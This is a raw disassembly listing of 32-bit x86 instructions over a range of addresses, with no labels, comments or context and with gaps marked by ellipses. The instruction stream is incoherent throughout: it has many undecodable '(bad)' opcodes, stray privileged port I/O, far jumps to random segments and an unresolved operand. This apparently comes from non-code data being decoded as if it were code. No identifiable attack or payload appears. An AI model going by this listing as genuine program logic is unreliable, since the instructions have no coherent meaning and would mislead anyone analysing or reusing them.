  421afa:	fldenv [ebx+0x9f3db27]
  421b00:	add    ah,BYTE PTR [ecx-0x2]
  421b03:	outs   dx,BYTE PTR ds:[esi]
  421b04:	ret    
  421b05:	pusha  
  421b06:	mov    al,0x9f
  421b08:	xchg   ebp,eax
  421b09:	mov    DWORD PTR [esi-0x3bbe960a],ebx
  421b0f:	in     eax,0x5d
  421b11:	mov    edi,DWORD PTR [edi+0x48]
  421b14:	outs   dx,DWORD PTR ds:[esi]
  421b15:	pop    esi
  421b16:	xor    dl,ch
  421b18:	(bad)
  421b1b:	inc    edx
  421b1c:	push   ebx
  421b1d:	dec    ebx
  421b1e:	pop    esi
  421b1f:	mov    edx,0xa85b3aa0
  421b24:	mov    WORD PTR [edi],gs
  421b26:	icebp  
  421b27:	add    ch,BYTE PTR [eax-0xe5edc41]
  421b2d:	add    eax,0xe68333c7
  421b32:	sti    
  421b33:	int3   
  421b34:	call   0x2df9c7b2
  421b39:	push   esi
  421b3a:	add    edi,0xda4aa929
  421b40:	inc    DWORD PTR [eax]
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    edx,DWORD PTR [ecx]
  421bc1:	mov    esp,esi
  421bc3:	add    DWORD PTR [ecx-0xafffe98],ebp
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [esi+0x972beff],cl
  421bd1:	call   0x5bb12e91
  421bd6:	ds xchg esp,eax
  421bd8:	jns    0x421bc3
  421bda:	mov    bl,0xec
  421bdc:	(bad)  
  421bdd:	out    dx,eax
  421bde:	pop    ss
  421bdf:	mov    dh,BYTE PTR [esp+edx*8-0x461b2cfa]
  421be6:	add    eax,0x3ffc4b8e
  421beb:	mov    dl,0xb2
  421bed:	or     eax,esi
  421bef:	dec    ebx
  421bf0:	rol    BYTE PTR [ebx+0x4a],1
  421bf3:	fimul  WORD PTR [ecx-0x340b9aee]
  421bf9:	push   ss
  421bfa:	adc    cl,BYTE PTR [esi-0x23d9529d]
  421c00:	ja     0x421bfc
  421c02:	mov    esi,0xad0a1332
  421c07:	iret   
  421c08:	pop    ss
  421c09:	mov    edi,0x446fc47a
  421c0e:	pop    ds
  421c0f:	dec    DWORD PTR [esi+0x74]
  421c12:	xchg   ebp,eax
  421c13:	ins    DWORD PTR es:[edi],dx
  421c14:	fcom   QWORD PTR [edx+0x67ccff8e]
  421c1a:	jae    0x421bcf
  421c1c:	push   esp
  421c1d:	sbb    DWORD PTR [esi],edi
  421c1f:	jb     0x421c17
  421c21:	das    
  421c22:	cmp    eax,0x54eadc72
  421c27:	sub    edx,DWORD PTR [edx+esi*1]
  421c2a:	jecxz  0x421bed
  421c2c:	and    dl,ah
  421c2e:	ret    0x4669
  421c31:	adc    DWORD PTR [eax-0x3ade3572],0x3f6fb6f2
  421c3b:	cld    
  421c3c:	out    0xc,al
  421c3e:	nop
  421c3f:	mov    edx,0x1719825b
  421c44:	pop    esi
  421c45:	jnp    0x8207a046
  421c4b:	jg     0x421c3c
  421c4d:	cmp    al,0x8
  421c4f:	inc    eax
  421c50:	call   0x74cd:0x6b02fb47
  421c57:	fs int 0xcb
  421c5a:	(bad)  
  421c5b:	aad    0xf7
  421c5d:	lds    esp,FWORD PTR [eiz*1+0x7e9a1f88]
  421c64:	les    ebx,FWORD PTR gs:[edi-0x768fde3a]
  421c6b:	enter  0xf6fa,0x1c
  421c6f:	push   esp
  421c70:	xchg   BYTE PTR [edi],al
  421c72:	in     al,dx
  421c73:	pop    edx
  421c74:	add    al,0xcc
  421c76:	ins    DWORD PTR es:[edi],dx
  421c77:	sbb    al,0x7d
  421c79:	mov    dl,0xe8
  421c7b:	test   BYTE PTR [ecx-0x17fab248],ch
  421c81:	xor    ah,dl
  421c83:	adc    cl,BYTE PTR [ecx+0x26a5e840]
  421c89:	jmp    0x421cc1
  421c8b:	aad    0xbf
  421c8d:	ret    0x28a0
  421c90:	push   esi
  421c91:	repnz mov cl,0x65
  421c94:	xlat   BYTE PTR ds:[ebx]
  421c95:	lods   al,BYTE PTR ds:[esi]
  421c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c97:	cli    
  421c98:	std    
  421c99:	icebp  
  421c9a:	cld    
  421c9b:	std    
  421c9c:	dec    edx
  421c9d:	mov    ch,0x90
  421c9f:	cli    
  421ca0:	mov    ebx,0x1e33e829
  421ca5:	mov    esp,0x5a644a75
  421caa:	nop
  421cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cac:	(bad)  
  421cad:	popf   
  421cae:	inc    eax
  421caf:	dec    esp
  421cb0:	ins    BYTE PTR es:[edi],dx
  421cb1:	dec    ebx
  421cb2:	dec    esp
  421cb3:	aam    0xad
  421cb5:	fsubrp st(4),st
  421cb7:	out    dx,eax
  421cb8:	pop    esi
  421cb9:	and    ebp,DWORD PTR ds:0xcf897573
  421cbf:	mov    eax,DWORD PTR [eax]
	...
  421d31:	add    BYTE PTR [eax],al
  421d33:	add    bh,ah
  421d35:	push   ds
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	out    dx,al
  421d41:	adc    BYTE PTR [eax],bl
  421d43:	xchg   edx,eax
  421d44:	sahf   
  421d45:	imul   eax,DWORD PTR [ecx],0xf500
  421d4b:	add    BYTE PTR [ecx+0x604955b3],ch
  421d51:	push   0x20
  421d53:	sub    DWORD PTR [esi+ecx*8+0x7b],edx
  421d57:	in     al,0x57
  421d59:	into   
  421d5a:	scas   al,BYTE PTR es:[edi]
  421d5b:	dec    esi
  421d5c:	inc    ebp
  421d5d:	cmp    eax,0x6117802a
  421d62:	add    edx,DWORD PTR [edi+0x77]
  421d65:	dec    eax
  421d66:	bound  edi,QWORD PTR [esi]
  421d68:	fldcw  WORD PTR ss:[eax-0x58b9fb7]
  421d6f:	push   eax
  421d70:	jb     0x421d32
  421d72:	fcmovnbe st,st(1)
  421d74:	sbb    ebx,DWORD PTR [ecx+edi*1-0x8]
  421d78:	out    0x28,al
  421d7a:	shl    ebp,1
  421d7c:	std    
  421d7d:	dec    ecx
  421d7e:	xor    ebp,esi
  421d80:	fisub  WORD PTR [edx+ebx*4-0x5b]
  421d84:	mov    ebx,0x5c31d9e0
  421d89:	dec    eax
  421d8a:	xchg   edx,eax
  421d8b:	(bad)  
  421d8c:	push   0x5c71c572
  421d91:	stos   BYTE PTR es:[edi],al
  421d92:	cmp    eax,0xba58056a
  421d97:	fld    QWORD PTR [esi+0x52]
  421d9a:	sbb    DWORD PTR [ecx+0x6759e7cb],eax
  421da0:	and    BYTE PTR [ecx+0x11],al
  421da3:	dec    ebp
  421da4:	cmp    ebx,esp
  421da6:	retf   
  421da7:	sbb    cl,cl
  421da9:	jno    0x421d37
  421dab:	leave  
  421dac:	enter  0x3717,0x82
  421db0:	xor    eax,0xe29457ea
  421db5:	out    dx,eax
  421db6:	mov    ebp,0x3fcf5a3
  421dbb:	fsubr  QWORD PTR [ecx-0x77]
  421dbe:	sbb    DWORD PTR ds:0x15b0abf5,esp
  421dc4:	test   DWORD PTR [edx-0x3],ebx
  421dc7:	mov    ah,0xa7
  421dc9:	leave  
  421dca:	data16 jl 0x421e0e
  421dcd:	xchg   BYTE PTR [ebx],bl
  421dcf:	mov    gs,WORD PTR [ebx-0x1b]
  421dd2:	es pop edx
  421dd4:	gs mov bh,0x7
  421dd7:	mov    ch,0x70
  421dd9:	out    0x5e,eax
  421ddb:	cmp    cl,BYTE PTR [edi-0x70e5de57]
  421de1:	aas    
  421de2:	adc    al,0x13
  421de4:	popa   
  421de5:	iret   
  421de6:	dec    eax
  421de7:	cli    
  421de8:	adc    DWORD PTR [ecx+0x75f4b180],0xffffff90
  421def:	loop   0x421d88
  421df1:	outs   dx,BYTE PTR ds:[esi]
  421df2:	pop    esi
  421df3:	sbb    DWORD PTR [eax],ebp
  421df5:	add    edi,0xffffffa5
  421df8:	shr    DWORD PTR [edx],cl
  421dfa:	mov    bh,0x69
  421dfc:	xchg   esp,eax
  421dfd:	jmp    0x406159fa
  421e02:	mov    al,0x35
  421e04:	jno    0x421e60
  421e06:	cmc    
  421e07:	fimul  DWORD PTR [ebx-0x593c9a64]
  421e0d:	enter  0x2094,0x5a
  421e11:	sti    
  421e12:	mov    WORD PTR [edx-0x54314cba],ss
  421e18:	hlt    
  421e19:	fisttp WORD PTR [ebx]
  421e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e1c:	ss cdq 
  421e1e:	not    al
  421e20:	cmp    cl,0x61
  421e23:	xor    al,0xc
  421e25:	adc    dh,bh
  421e27:	pop    edx
  421e28:	push   ecx
  421e29:	jne    0x421e34
  421e2b:	pop    edx
  421e2c:	adc    ebx,0xffffffbf
  421e2f:	add    DWORD PTR [edx],ebp
  421e31:	vpand  ymm0,ymm2,ymm7
  421e35:	xchg   ebp,eax
  421e36:	dec    edi
  421e37:	mov    edx,0x8b3a5630
  421e3c:	lds    ebp,FWORD PTR [edi-0x67]
  421e3f:	es pop ss
	...
  421eb1:	add    BYTE PTR [eax],al
  421eb3:	add    BYTE PTR [eax],ah
  421eb5:	xchg   edi,eax
  421eb6:	inc    edx
  421eb7:	shl    edi,cl
  421eb9:	xlat   BYTE PTR ds:[ebx]
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421f09
  421ec1:	sub    ebx,DWORD PTR ds:0x16a9346
  421ec7:	add    ch,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    BYTE PTR [edi],dh
  421ecd:	jo     0x421e6e
  421ecf:	jns    0x421f2b
  421ed1:	cmp    esp,DWORD PTR [edi]
  421ed3:	bndstx [ebx+ebx*1],bnd2
  421ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ed8:	jno    0x421e8a
  421eda:	adc    eax,0xabb3e43
  421edf:	sub    bl,ah
  421ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ee2:	std    
  421ee3:	sbb    al,BYTE PTR [edi]
  421ee5:	mov    esi,0x2b28577c
  421eea:	mov    ebx,DWORD PTR [ecx+0x1c138317]
  421ef0:	bound  ebx,QWORD PTR [ebx]
  421ef2:	loope  0x421f36
  421ef4:	push   ds
  421ef5:	mov    DWORD PTR [ebx],esp
  421ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ef8:	aam    0x5f
  421efa:	sub    edx,DWORD PTR [ebp-0x73]
  421efd:	mov    ecx,0xd9600200
  421f02:	inc    eax
  421f03:	dec    eax
  421f04:	addr16 fucom st(0)
  421f07:	add    al,0x96
  421f09:	ds (bad) 
  421f0b:	mov    al,0x33
  421f0d:	fiadd  DWORD PTR [esi+0x3275b0a8]
  421f13:	dec    edi
  421f14:	cdq    
  421f15:	idiv   DWORD PTR [ecx]
  421f17:	inc    ecx
  421f18:	es jae 0x421f1a
  421f1b:	fwait
  421f1c:	cmc    
  421f1d:	xchg   esp,eax
  421f1e:	jge    0x421ee7
  421f20:	and    esp,DWORD PTR [ebx-0x8]
  421f23:	inc    esp
  421f24:	scas   al,BYTE PTR es:[edi]
  421f25:	xor    eax,0x865e3506
  421f2a:	je     0x421f56
  421f2c:	fnstsw WORD PTR [edx-0x37]
  421f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f30:	lods   al,BYTE PTR ds:[esi]
  421f31:	js     0x421ef3
  421f33:	call   0xe506:0x2f0714b2
  421f3a:	cmp    bh,BYTE PTR [ebp+0x30]
  421f3d:	cmp    esi,DWORD PTR [ebx+0x3ad63c4]
  421f43:	push   ebx
  421f44:	push   es
  421f45:	mov    esp,0x7a091afd
  421f4a:	in     eax,dx
  421f4b:	lahf   
  421f4c:	add    BYTE PTR [eax],cl
  421f4e:	pop    eax
  421f4f:	dec    edi
  421f50:	push   ebx
  421f51:	arpl   di,si
  421f53:	sub    BYTE PTR [ebx+0x4b],cl
  421f56:	in     eax,0xf
  421f58:	pop    ebp
  421f59:	cs push 0x10
  421f5c:	lea    edx,[ecx+0x57c7a9d0]
  421f62:	pop    ds
  421f63:	jp     0x421fae
  421f65:	lods   eax,DWORD PTR ds:[esi]
  421f66:	mov    bl,0xd5
  421f68:	push   0xfffffff1
  421f6a:	add    DWORD PTR [ecx-0x466d8cd],ecx
  421f70:	mov    ch,0x2b
  421f72:	div    DWORD PTR [ecx+0x6b]
  421f75:	cld    
  421f76:	fisttp QWORD PTR [eax-0x5116cf6b]
  421f7c:	sub    DWORD PTR [ebp-0x60af5987],0xffffffa3
  421f83:	xchg   edi,eax
  421f84:	out    dx,eax
  421f85:	popa   
  421f86:	stc    
  421f87:	xchg   esp,eax
  421f88:	sub    esp,DWORD PTR [edi-0x33b17e9f]
  421f8e:	jl     0x421ff4
  421f90:	or     DWORD PTR [ebx],edi
  421f92:	sar    DWORD PTR ds:[edi-0x2f],1
  421f96:	add    DWORD PTR [ecx-0x5],0x21
  421f9a:	jbe    0x421f71
  421f9c:	stos   DWORD PTR es:[edi],eax
  421f9d:	inc    edi
  421f9e:	lods   eax,DWORD PTR ds:[esi]
  421f9f:	jno    0x421f60
  421fa1:	inc    esp
  421fa2:	add    al,dh
  421fa4:	sub    bl,al
  421fa6:	cmp    BYTE PTR [edx-0xfcb5178],0x7c
  421fad:	mov    eax,0x69bf4fd5
  421fb2:	out    0xce,al
  421fb4:	data16 loopne 0x421fe9
  421fb7:	mov    ds:0xa202881a,eax
  421fbc:	inc    ecx
  421fbd:	pop    es
  421fbe:	int    0x3d
  421fc0:	bound  eax,QWORD PTR [eax]
	...
  422032:	add    BYTE PTR [eax],al
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0xe640e142
  422044:	mov    BYTE PTR [ebx+0x1],ch
  422047:	add    ch,dh
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR [ebp+eax*1-0x41021893],bl
  422052:	icebp  
  422053:	in     al,dx
  422054:	call   0xa073f981
  422059:	dec    eax
  42205a:	aad    0x53
  42205c:	jge    0x42205c
  42205e:	ds sbb al,0xaa
  422061:	sahf   
  422062:	or     ch,BYTE PTR [eax+esi*2]
  422065:	sbb    BYTE PTR [ebp+0x1da522aa],0x22
  42206c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42206d:	fsub   DWORD PTR es:[edi-0x4d]
  422071:	sub    eax,0x454a81e0
  422076:	fmul   QWORD PTR [ebp-0x54cab183]
  42207c:	pushf  
  42207d:	or     ax,0x772
  422081:	xchg   ebp,eax
  422082:	mov    WORD PTR [ebx-0x7],?
  422085:	sub    BYTE PTR [ebx+0x36],ah
  422088:	ret    0x2ab2
  42208b:	and    edi,DWORD PTR [edx]
  42208d:	adc    BYTE PTR [eax+0x44eed80f],bl
  422093:	pushf  
  422094:	cdq    
  422095:	dec    edx
  422096:	push   ebp
  422097:	add    al,0x3
  422099:	mov    al,0x35
  42209b:	inc    edi
  42209c:	dec    ebx
  42209d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42209e:	lods   al,BYTE PTR ds:[esi]
  42209f:	or     edi,esi
  4220a1:	push   edi
  4220a2:	mov    al,ds:0x6ec24509
  4220a7:	mov    bl,0xb6
  4220a9:	jbe    0x422071
  4220ab:	std    
  4220ac:	inc    ebp
  4220ad:	ret    
  4220ae:	bound  edx,QWORD PTR [ebx+ebx*4+0x46]
  4220b2:	sbb    ah,al
  4220b4:	mov    edi,0x6205e19b
  4220b9:	lods   al,BYTE PTR ds:[esi]
  4220ba:	sbb    DWORD PTR [ecx+0x60e4c0a9],0xde0aa9d9
  4220c4:	mov    eax,ds:0x3cb06ce4
  4220c9:	in     eax,dx
  4220ca:	push   cs
  4220cb:	rcl    BYTE PTR [edx-0x33],1
  4220ce:	jb     0x42213c
  4220d0:	leave  
  4220d1:	cs in  al,dx
  4220d3:	xchg   DWORD PTR [ebx-0xc],ebx
  4220d6:	sub    ch,cl
  4220d8:	nop
  4220d9:	dec    esp
  4220da:	imul   ebp,DWORD PTR [ebx-0x44],0x25
  4220de:	ret    0xcfea
  4220e1:	out    dx,al
  4220e2:	xlat   BYTE PTR ds:[ebx]
  4220e3:	test   BYTE PTR [ecx+edi*1],ch
  4220e6:	adc    dh,cl
  4220e8:	pop    ds
  4220e9:	push   es
  4220ea:	shl    DWORD PTR [ebx-0x11],cl
  4220ed:	stos   DWORD PTR es:[edi],eax
  4220ee:	je     0x4220c4
  4220f0:	jns    0x422106
  4220f2:	leave  
  4220f3:	pop    esi
  4220f4:	clc    
  4220f5:	mov    esi,ebp
  4220f7:	neg    DWORD PTR [esi]
  4220f9:	nop
  4220fa:	cmp    al,0xac
  4220fc:	call   DWORD PTR [eax-0x40]
  4220ff:	daa    
  422100:	and    eax,0xb933b148
  422105:	and    DWORD PTR [ebx],0xadedf983
  42210b:	or     DWORD PTR [edi-0x50011011],esp
  422111:	mov    esi,cs
  422113:	aad    0x1f
  422115:	xchg   esi,eax
  422116:	xor    al,0xfd
  422118:	data16 scas al,BYTE PTR es:[edi]
  42211a:	(bad)  
  42211b:	mov    esp,0xec0559e9
  422120:	jmp    0xf151:0xa93164e9
  422127:	mov    bh,0x39
  422129:	jge    0x422158
  42212b:	rol    BYTE PTR [esi-0x80],cl
  42212e:	fiadd  DWORD PTR [esi]
  422130:	dec    esp
  422131:	retf   0x2eab
  422134:	add    cl,BYTE PTR [ecx-0x76]
  422137:	or     DWORD PTR [ebp+edx*2-0x3c1b6a19],esp
  42213e:	es jbe 0x422115
	...
  4221b1:	add    BYTE PTR [eax],al
  4221b3:	add    BYTE PTR [esi-0x700870e1],bl
  4221b9:	idiv   esi
  4221bb:	jg     0x4221f8
  4221bd:	data16 daa 
  4221bf:	aad    0xb1
  4221c1:	jbe    0x4221ec
  4221c3:	idiv   BYTE PTR [ebp+0x6c]
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	cmc    
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [edx-0x68],ch
  4221ce:	sbb    cl,cl
  4221d0:	push   esp
  4221d1:	add    bl,BYTE PTR [ebx]
  4221d3:	in     eax,dx
  4221d4:	sbb    eax,0xb387caff
  4221d9:	xchg   DWORD PTR [esi+0x55b4bc0b],edx
  4221df:	and    BYTE PTR [ebx+ebp*8-0x27b4b547],ch
  4221e6:	callw  0x28f
  4221ea:	jmp    0x32ce:0x6a49fe6a
  4221f1:	imul   ecx,DWORD PTR [esi-0x1daa4bd0],0xffffff9f
  4221f8:	int    0xc3
  4221fa:	xchg   ebx,eax
  4221fb:	cdq    
  4221fc:	lock sbb BYTE PTR cs:[ecx-0x7a200e2c],bl
  422204:	sbb    BYTE PTR [eax+0x3f],ah
  422207:	inc    esi
  422208:	icebp  
  422209:	jns    0x422289
  42220b:	ss loope 0x4221a1
  42220e:	test   DWORD PTR [eax+0x77510e4c],0xe9012020
  422218:	push   edx
  422219:	test   BYTE PTR [edi+ebx*8+0x1739e326],ch
  422220:	out    dx,al
  422221:	ja     0x422284
  422223:	dec    esi
  422224:	pushf  
  422225:	jns    0x422249
  422227:	mov    ecx,0xc5953ebf
  42222c:	xchg   edx,eax
  42222d:	and    DWORD PTR [ebx],esp
  42222f:	sbb    eax,0x4520eda1
  422234:	sub    eax,0xe384bc82
  422239:	mov    al,ds:0xf9d30611
  42223e:	add    DWORD PTR [ebp-0xc],esp
  422241:	dec    edx
  422242:	test   BYTE PTR [edx+0x73],bl
  422245:	or     ebx,DWORD PTR [edi+0x4f]
  422248:	iret   
  422249:	dec    esp
  42224a:	adc    DWORD PTR [esi-0x60],esp
  42224d:	out    dx,eax
  42224e:	inc    edx
  42224f:	or     al,0x4a
  422251:	jo     0x42222d
  422253:	les    esi,FWORD PTR [eax+0x48b268f2]
  422259:	mov    bl,0x53
  42225b:	push   ds
  42225c:	add    ebx,edx
  42225e:	(bad)  
  42225f:	fdivr  st(7),st
  422261:	clc    
  422262:	(bad)  
  422263:	cmp    ch,ah
  422265:	dec    ebx
  422266:	fwait
  422267:	jo     0x422218
  422269:	scas   al,BYTE PTR es:[edi]
  42226a:	fdiv   st(4),st
  42226c:	retf   0x7bff
  42226f:	les    eax,FWORD PTR [eax+eax*8+0x1c]
  422273:	sub    BYTE PTR [edi+0x46],bh
  422276:	fst    QWORD PTR [ebp-0x1c]
  422279:	xor    al,0x7e
  42227b:	jae    0x42221a
  42227d:	add    eax,0xf1796dd4
  422282:	jo     0x422239
  422284:	mov    ebx,0x5b8b9054
  422289:	test   al,0x26
  42228b:	xchg   ecx,eax
  42228c:	jl     0x422221
  42228e:	test   al,0x2a
  422290:	jb     0x4222f2
  422292:	adc    ebx,DWORD PTR [ecx+0x16]
  422295:	sahf   
  422296:	in     eax,dx
  422297:	jb     0x422247
  422299:	xor    ebp,ebp
  42229b:	in     al,dx
  42229c:	add    DWORD PTR [ebx],eax
  42229e:	int3   
  42229f:	fstp   QWORD PTR [esp+esi*8-0x4d]
  4222a3:	and    BYTE PTR [eax],cl
  4222a5:	jbe    0x42224d
  4222a7:	cmp    edx,DWORD PTR [ebp+ebp*4-0x3]
  4222ab:	mov    BYTE PTR [ecx],al
  4222ad:	pop    ecx
  4222ae:	add    DWORD PTR [ebp+0x60],ebp
  4222b1:	jne    0x4222b1
  4222b3:	mov    al,0x71
  4222b5:	daa    
  4222b6:	mov    ch,0x61
  4222b8:	shl    ch,0xa0
  4222bb:	fmul   DWORD PTR [ebx+ebx*4+0xbdeced]
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	and    esp,DWORD PTR [ecx+0x6a]
  422343:	adc    esi,DWORD PTR [edx+0x6d]
  422346:	add    DWORD PTR [eax],eax
  422348:	cmc    
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [edi-0x12f7d6ab],dl
  422351:	jb     0x4223b1
  422353:	cmp    eax,0xdf6e1beb
  422358:	mov    esi,0x392c34f
  42235d:	jecxz  0x422331
  42235f:	and    DWORD PTR [edi],0xceb229c5
  422365:	test   BYTE PTR [edx],al
  422367:	fld    QWORD PTR ds:0x16541f9
  42236d:	(bad)  
  42236e:	lods   al,BYTE PTR ds:[esi]
  42236f:	xchg   edi,eax
  422370:	test   eax,0xa76d3cbd
  422375:	xchg   DWORD PTR [esi-0x1d72e688],edx
  42237b:	mov    BYTE PTR [edx-0x2f594fd3],bl
  422381:	xor    eax,0xee60d172
  422386:	add    BYTE PTR [edi-0x3f9b9ac9],bl
  42238c:	hlt    
  42238d:	jns    0x422347
  42238f:	and    al,0xc2
  422391:	jnp    0x42240b
  422393:	mov    ch,0xb1
  422395:	adc    al,0xc6
  422397:	push   0x39
  422399:	std    
  42239a:	jge    0x42234b
  42239c:	arpl   WORD PTR [esi],cx
  42239e:	rol    ebx,0xac
  4223a1:	out    dx,al
  4223a2:	sahf   
  4223a3:	mov    dh,0xcc
  4223a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a6:	push   ebx
  4223a7:	aaa    
  4223a8:	jg     0x4223e6
  4223aa:	mov    esi,0x5aaf7f79
  4223af:	stos   DWORD PTR es:[edi],eax
  4223b0:	popa   
  4223b1:	add    al,0xb3
  4223b3:	daa    
  4223b4:	in     al,dx
  4223b5:	test   al,ah
  4223b7:	xor    al,0x87
  4223b9:	cdq    
  4223ba:	mov    cl,0x5e
  4223bc:	test   esp,esp
  4223be:	and    ch,BYTE PTR [edx]
  4223c0:	jne    0x422412
  4223c2:	and    esi,DWORD PTR [ebx-0x6d7d695c]
  4223c8:	xchg   esp,eax
  4223c9:	sbb    al,BYTE PTR [esi-0x33]
  4223cc:	nop    DWORD PTR [eax-0x6fe76488]
  4223d3:	or     BYTE PTR ds:0x37e802e3,al
  4223d9:	daa    
  4223da:	mov    esi,0x3892273e
  4223df:	push   esp
  4223e0:	call   0xf3c1:0xdfde17b6
  4223e7:	jp     0x42241e
  4223e9:	icebp  
  4223ea:	lea    ebp,[edi+0x16]
  4223ed:	inc    ebx
  4223ee:	jg     0x422439
  4223f0:	jecxz  0x422463
  4223f2:	jnp    0x4223bd
  4223f4:	retf   0x71ee
  4223f7:	cmp    DWORD PTR [eax],0xe94c972e
  4223fd:	stc    
  4223fe:	test   eax,0xc76a7880
  422403:	ret    
  422404:	adc    dh,BYTE PTR [esi-0x66]
  422407:	jno    0x4223d2
  422409:	aaa    
  42240a:	adc    ch,0x4d
  42240d:	out    dx,al
  42240e:	adc    DWORD PTR [ebx],ecx
  422410:	aam    0xcd
  422412:	call   0x9ea9fb17
  422417:	fchs   
  422419:	clc    
  42241a:	mov    ds:0x4e520c86,al
  42241f:	jecxz  0x42244f
  422421:	bnd jae 0x422499
  422424:	or     BYTE PTR [ecx],0xc9
  422427:	add    al,BYTE PTR [ecx-0x51]
  42242a:	inc    edi
  42242b:	mov    ebp,0x7b890b24
  422430:	cs loop 0x42244b
  422433:	fcom   DWORD PTR [ebp+0x1c]
  422436:	jl     0x4223fd
  422438:	xlat   BYTE PTR ds:[ebx]
  42243a:	outs   dx,DWORD PTR ds:[esi]
  42243b:	or     ebx,ebx
  42243d:	mov    ebx,DWORD PTR [ebx+0xe067]
	...
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x59ad9f7c
  4224c2:	mov    ah,0x8
  4224c4:	outs   dx,BYTE PTR ds:[si]
  4224c6:	add    DWORD PTR [eax],eax
  4224c8:	cmc    
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    al,bh
  4224cd:	push   0xffffff9a
  4224cf:	push   ds
  4224d0:	ja     0x42252d
  4224d2:	add    BYTE PTR [ecx-0x31],al
  4224d5:	push   edx
  4224d6:	push   ecx
  4224d7:	shl    BYTE PTR [ecx+0x669af54c],0xfb
  4224de:	ds push ebx
  4224e0:	mov    eax,ds:0x57532fdd
  4224e5:	sbb    al,0x91
  4224e7:	scas   al,BYTE PTR es:[edi]
  4224e8:	pop    eax
  4224e9:	pop    bp
  4224eb:	push   edx
  4224ec:	int3   
  4224ed:	xchg   BYTE PTR [edi-0x16],bl
  4224f0:	mov    ebx,0x8ae9f816
  4224f5:	add    ebp,0x23fc18fa
  4224fb:	scas   eax,DWORD PTR es:[edi]
  4224fc:	mov    esi,0xfa3dda97
  422501:	inc    esp
  422502:	mov    cl,0x61
  422504:	xchg   ebx,eax
  422505:	pop    ds
  422506:	iret   
  422507:	sub    DWORD PTR [edx],ebx
  422509:	out    dx,eax
  42250a:	xchg   esp,eax
  42250b:	mov    al,ds:0x29f31bad
  422510:	xchg   esp,eax
  422511:	add    DWORD PTR [eax-0x76],ebp
  422514:	ja     0x4224f8
  422516:	int    0x6f
  422518:	lahf   
  422519:	mov    ah,0x8f
  42251b:	idiv   BYTE PTR [esi-0x47]
  42251e:	dec    edx
  42251f:	and    eax,0x8fdae177
  422524:	push   0xfffffff7
  422526:	and    ebp,ebx
  422528:	inc    esi
  422529:	mov    DWORD PTR [ebx-0x54eb3bc9],ebx
  42252f:	mov    ebx,0xaf33bb1
  422534:	adc    ah,BYTE PTR [ecx]
  422536:	ins    BYTE PTR es:[edi],dx
  422537:	cmp    al,0x3e
  422539:	inc    ebx
  42253a:	or     eax,0x324b6e03
  42253f:	mov    bh,BYTE PTR [ebp+0x5b605571]
  422545:	xchg   esi,eax
  422546:	jmp    0xd1b07468
  42254b:	mov    DWORD PTR ds:0x5a526104,edi
  422551:	test   BYTE PTR [edi-0x7ecf24ea],bl
  422557:	lods   al,BYTE PTR ds:[esi]
  422558:	or     al,0x6d
  42255a:	sahf   
  42255b:	mov    ebp,0xcfed1571
  422560:	cli    
  422561:	mov    fs,edi
  422563:	or     al,0xf4
  422565:	repnz loopne 0x4225d4
  422568:	mov    ch,0xd9
  42256a:	stos   DWORD PTR es:[edi],eax
  42256b:	scas   al,BYTE PTR es:[edi]
  42256c:	(bad)  
  42256d:	arpl   WORD PTR [ecx],bx
  42256f:	fidiv  WORD PTR [esi+0x21eab2aa]
  422575:	repz xor eax,0xbca6695b
  42257b:	mov    al,ds:0xc37a8157
  422580:	cdq    
  422581:	mov    eax,0xbe176238
  422586:	xchg   BYTE PTR [ecx+0x47],bl
  422589:	pop    edi
  42258a:	sbb    BYTE PTR [ecx],dh
  42258c:	mov    dh,0xa1
  42258e:	(bad)  
  42258f:	jmp    0x422532
  422591:	and    ebp,DWORD PTR [ebp-0x1e4131ad]
  422597:	aam    0xbb
  422599:	fstp   QWORD PTR [ecx+0x72808faa]
  42259f:	jmp    0xa76:0x9939fc85
  4225a6:	jge    0x4225f8
  4225a8:	push   cs
  4225a9:	add    eax,0xc909a5e7
  4225ae:	scas   al,BYTE PTR es:[edi]
  4225af:	adc    bl,bh
  4225b1:	pop    esp
  4225b2:	xchg   esp,eax
  4225b3:	xchg   esi,eax
  4225b4:	sub    al,BYTE PTR [ebx]
  4225b6:	enter  0x775b,0x5e
  4225ba:	cwde   
  4225bb:	or     al,0x15
  4225bd:	ins    BYTE PTR es:[edi],dx
  4225be:	adc    DWORD PTR [ebp+0x5d],edi
	...
  422634:	stos   DWORD PTR es:[edi],eax
